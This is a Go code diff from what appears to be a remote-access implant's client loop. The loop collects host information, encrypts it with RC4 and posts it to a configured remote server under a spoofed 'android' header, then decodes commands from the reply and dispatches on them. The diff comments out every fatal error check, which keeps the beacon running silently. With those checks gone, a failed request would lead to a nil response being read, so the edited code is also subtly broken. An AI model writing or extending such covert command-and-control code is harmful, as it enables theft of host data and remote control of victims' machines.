@@ -10,7 +10,7 @@ import (
 	//"fmt"
 	"github.com/satori/go.uuid"
 	"io/ioutil"
-	"log"
+	//"log"
 	"net/http"
 	"strconv"
 	"strings"
@@ -40,7 +40,8 @@ type Core struct {
 	uuid          string
 	event         []Result
 }
-func (c *Core) RefreshInfo(){
+
+func (c *Core) RefreshInfo() {
 	c.info = utils.GetInformation()
 }
 func (c *Core) Pool() {
@@ -54,30 +55,30 @@ func (c *Core) Pool() {
 		bytesJson, err := json.Marshal(data)
 		if err != nil {
 			//fmt.Println(1)
-			log.Fatal(err)
+			//log.Fatal(err)
 		}
 		encode := utils.ImmediateRC4(bytesJson)
 		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
 		if err != nil {
 			//fmt.Println(2)
-			log.Fatal(err)
+			//log.Fatal(err)
 		}
 		req.Header.Add("UA", "android")
 		resp, err := client.Do(req)
 		if err != nil {
-			log.Fatal(err)
+			//log.Fatal(err)
 		}
 		body, err := ioutil.ReadAll(resp.Body)
 		if err != nil {
 			//fmt.Println(3)
-			log.Fatal(err)
+			//log.Fatal(err)
 		}
 		decode := utils.ImmediateRC4(body)
 
 		err = json.Unmarshal(decode, &result)
 		if err != nil {
 			//fmt.Println(4)
-			log.Fatal(err)
+			//log.Fatal(err)
 		}
 		for _, i := range result {
 			switch i.Do {
@@ -171,9 +172,9 @@ func NewClient() Core {
 	} else {
 		u = u2.String()
 	}
-	//fmt.Println("Target", strings.TrimSpace(config.RemoteAddres))
+	//fmt.Println("Target", strings.TrimSpace(config.RemoteAddress))
 	c := Core{
-		remoteAddress: strings.TrimSpace(config.RemoteAddres),
+		remoteAddress: strings.TrimSpace(config.RemoteAddress),
 		info:          utils.GetInformation(),
 		uuid:          u,
 		sleep:         config.DefaultSleep,
